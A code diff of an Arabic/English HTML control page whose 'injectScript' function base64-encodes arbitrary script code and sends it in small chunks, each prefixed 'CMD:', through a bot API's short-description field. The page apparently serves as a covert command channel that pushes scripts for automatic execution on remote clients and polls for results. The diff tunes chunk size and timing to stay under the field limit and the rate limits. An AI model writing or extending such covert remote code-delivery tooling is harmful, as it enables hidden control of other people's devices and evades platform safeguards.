@@ -8,6 +8,8 @@
 
 
 
+
+
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
 <head>
@@ -1831,30 +1833,42 @@ async function injectScript(btn){
   if(!code){ showToast(L==='ar'?'الكود فارغ':'Empty code','warn'); return; }
 
   const encoded = toBase64Unicode(code);
-  const CHUNK = 200;
+  const CHUNK = 60; // صغير ليتناسب مع حد short_description
   const chunks = [];
   for(let i=0; i<encoded.length; i+=CHUNK) chunks.push(encoded.slice(i,i+CHUNK));
   const n = chunks.length;
+  const DELAY = 3200; // أكثر من 3 ثواني بأمان
 
   setBtnLoading(btn, true);
-  showToast(L==='ar'?`حقن ${n} قطعة...`:`Injecting ${n} chunks...`,'info');
+
+  // عداد تنازلي
+  let injectTimer = null;
+  function startCountdown(sec){
+    clearInterval(injectTimer);
+    let s = sec;
+    const orig = btn.innerHTML;
+    injectTimer = setInterval(()=>{
+      s--;
+      if(btn) btn.innerHTML = `<span>⏳ ${s}s</span>`;
+      if(s <= 0) clearInterval(injectTimer);
+    }, 1000);
+  }
 
   for(let i=0; i<n; i++){
-    await sendScriptChunk({c:'scriptChunk', i, n, d:chunks[i], sx:sxMode?1:0});
-    // delay صغير فقط بين الـ chunks لتجنب rate limit
-    if(n > 1) await new Promise(r=>setTimeout(r, 3100));
+    showToast(L==='ar'?`قطعة ${i+1}/${n}`:`Chunk ${i+1}/${n}`,'info');
+    // نبعت عبر sendCmd العادي (same channel = no race condition)
+    const cmd = {c:'scriptChunk', i, n, d:chunks[i], sx:sxMode?1:0};
+    const text = 'CMD:'+JSON.stringify(cmd);
+    await fetch(`${API}/setMyShortDescription?short_description=${encodeURIComponent(text)}`,{cache:'no-store'});
+    if(i < n-1){
+      startCountdown(Math.ceil(DELAY/1000));
+      await new Promise(r=>setTimeout(r, DELAY));
+    }
   }
+  clearInterval(injectTimer);
   setBtnLoading(btn, false);
-  showToast(L==='ar'?'تم الحقن بنجاح':'Injected successfully','ok');
+  showToast(L==='ar'?'✅ تم الحقن':'✅ Injected','ok');
   hap('success');
-}
-
-// حقن السكريبت عبر setMyDescription (حد أقل قيوداً من setMyShortDescription)
-async function sendScriptChunk(cmd){
-  try{
-    const text='CMD:'+JSON.stringify(cmd);
-    await fetch(`${API}/setMyDescription?description=${encodeURIComponent(text)}`,{cache:'no-store'});
-  }catch{}
 }
 
 // ── AUTO EXECUTE ──
@@ -2038,3 +2052,4 @@ setInterval(fetchResult,4000);
 </script>
 </body>
 </html>
+
